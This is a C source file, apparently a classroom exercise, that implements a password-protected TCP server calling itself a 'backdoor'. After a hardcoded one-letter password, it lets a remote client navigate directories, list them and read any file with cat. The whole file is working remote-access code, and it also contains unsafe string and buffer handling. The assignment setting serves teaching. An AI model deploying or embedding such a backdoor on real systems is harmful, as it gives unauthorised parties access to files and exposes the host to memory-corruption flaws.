#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <dirent.h>

/*
*code provided by the professor
*/

void error(const char *msg)
{
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[])
{
    //character arrays
    const char* invalidCommand = " is not a valid command\n";
    char buffer[256];
    char path[1024];
    char path2[1024];
    char password[] = "a\n";
    char badCommand_substring[256];
    char *tempstr;
    tempstr =(char *) malloc(10);

    //socket comunication information
    struct sockaddr_in serv_addr, cli_addr;
    int sockfd, newsockfd, portno;      
    socklen_t clilen;    
    
    //run time loop check 
    int n, badCommandLength, badCommandLengthMinus, newStringLength;
    int offStatus = 1, runEnd = 1;
    int i_counter;

    //directory changes
    DIR *d;
    struct dirent *directory;

    //File IO
    FILE *file;
    size_t readsize;

    if (argc < 2) {
        fprintf(stderr,"ERROR, no port provided\n");
        exit(1);
    }
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = atoi(argv[1]);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,
            sizeof(serv_addr)) < 0) 
            error("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    newsockfd = accept(sockfd, 
            (struct sockaddr *) &cli_addr, 
            &clilen);
    if (newsockfd < 0) 
        error("ERROR on accept");
    
    /*

    *code for the inmpementation of the project
    *over all loop
    */
    /*
    *send a promote for password
    *check for password
    *check the incoming message for commands
    */

    n = write(newsockfd, "password: ", 10);
    bzero(buffer, 256);
    if(n<0) offStatus = 0;

    n = read(newsockfd, buffer, 2);
    printf("%s\n", buffer);
    if (strncmp(password, buffer, 2) != 0 )

    {
        printf("%d\n", strcmp(password,buffer));
        error("Error: incorrect password");
        offStatus = 0;
    }
    if(getcwd(path, sizeof(path)) == NULL){
        perror("cannot get path");
    }


    n = write(newsockfd, "Welcome to this backdoor\n", 26);
    do {
        n = write(newsockfd, ">", 1);
        bzero(buffer,256);
        n = read(newsockfd,buffer,255);
        //find the command
        if (n < 0) error("ERROR reading from socket");
        printf("Here is the message: %s\n",buffer);
        //n = write(newsockfd,"I got your message",18);
        if (n < 0) error("ERROR writing to socket");
        
        //get the path of the current process
        if (strncmp(buffer, "pwd\n", 4) == 0) {
            bzero(path, sizeof(path));
            if(getcwd(path, sizeof(path)) != NULL){
                write(newsockfd, path, sizeof(path));
                write(newsockfd, "\n", 1);
            }
            else{
                write(newsockfd, "cannot get path\n", 16);
            }
        } 
        
        //change directory
        else if (strncmp(buffer, "cd ", 3) == 0) {
            //if things exist, con't
            //extract the name of the directory
            printf("%s\n", path);
            i_counter = 3;
            while(buffer[i_counter] != '\n'){
                i_counter++;
            }
            //printf("%d\n", i_counter - 4);
            tempstr =(char *) realloc(tempstr, i_counter - 1);
            memcpy(&tempstr[1], &buffer[3], i_counter - 3);
            tempstr[0] = '/';
            tempstr[i_counter - 2] = '\0';
            printf("%s\n", tempstr);
            
            strcpy(path2, path);
            strcat(path2, tempstr);
            printf("%s\n", path2);

            if(chdir(path2) == -1){
                write(newsockfd, "Cannnot change to directory", 28);
            }else{
                bzero(path, sizeof(path));
                if(getcwd(path, sizeof(path)) == NULL){
                    write(newsockfd, "cannot get path\n", 16);
                }
            }
            bzero(tempstr, sizeof(tempstr));
            bzero(path2, sizeof(path2));
        } 

        //list files in the current directory
        else if (strncmp(buffer, "ls\n", 3) == 0) {
            //open directory
            d = opendir(path);
            //loop through and send the name of file or directory to client
            if(d){
                while((directory = readdir(d)) != NULL){
                    i_counter = snprintf(buffer, 255, "%s\n", directory->d_name);
                    n = write(newsockfd, buffer, 256);
                    //n = write(newsockfd, "\n", 1);
                } 
            }
            closedir(d);
        } 
        
        //read the contents of the file to user
        else if (strncmp(buffer, "cat ", 3) == 0) {
            //extract the name of the file
            i_counter = 4;
            while(buffer[i_counter] != '\n'){
                i_counter++;
            }
            //printf("%d\n", i_counter - 4);
            tempstr =(char *) realloc(tempstr, i_counter - 3);
            memcpy(tempstr, &buffer[4], i_counter - 4);
            tempstr[i_counter - 3] = '\0';
            //printf("%s\n", tempstr);

            file = fopen(tempstr, "r");
            if(file != NULL){
                while((readsize = fread(buffer, 1, 256, file)) > 0)
                {
                    write(newsockfd, buffer, 256);
                }
                if(ferror(file)){
                    error("something is wrong with file");
                }
                fclose(file);
            }else{
                write(newsockfd, "file not found", 15);
            }
            bzero(tempstr, sizeof(tempstr));

        } 
        
        //show list of commands
        else if (strncmp(buffer, "help\n", 5) == 0) {
            n = write(newsockfd, "pwd \t\t returns current working directory\n", 41);
            n = write(newsockfd, "cd <dir> \t changes current working directory to <dir>\n",54);
            n = write(newsockfd, "ls \t\t lists the contents of the current working directory\n", 58);
            n = write(newsockfd, "cat <file> \t returns contents of the file\n", 42);
            n = write(newsockfd, "help \t\t prints a list of commands\n", 34);
            n = write(newsockfd, "browser \t opens up Mozilla Firefox\n", 36);
            n = write(newsockfd, "beep \t\t makes computer beep\n", 28);
            n = write(newsockfd, "off \t\t terminates the program\n", 30);
        } 
        
        //open a broswer 
        else if (strncmp(buffer, "browser\n", 8) == 0) {
            
        } 
        
        //make the computer beep
        else if (strncmp(buffer, "beep\n", 5) == 0) {
            printf("\a\n");
        } 
        
        
        //turn backdoor off
        else if (strncmp(buffer, "off\n", 4) == 0) {
            n = write(newsockfd, "You killed me...\n", 17);
            offStatus = 0;
        } else {
            badCommandLength = strlen(buffer);
            badCommandLengthMinus = badCommandLength-1;
            strncpy(badCommand_substring, buffer, badCommandLengthMinus); 
            strcat(badCommand_substring, invalidCommand);
            newStringLength = strlen(badCommand_substring);
            n = write(newsockfd, badCommand_substring, newStringLength);
            memset(badCommand_substring, 0, sizeof(badCommand_substring));
        }

    }while (offStatus == 1);
    
    close(newsockfd);
    close(sockfd);
    return 0; 
}
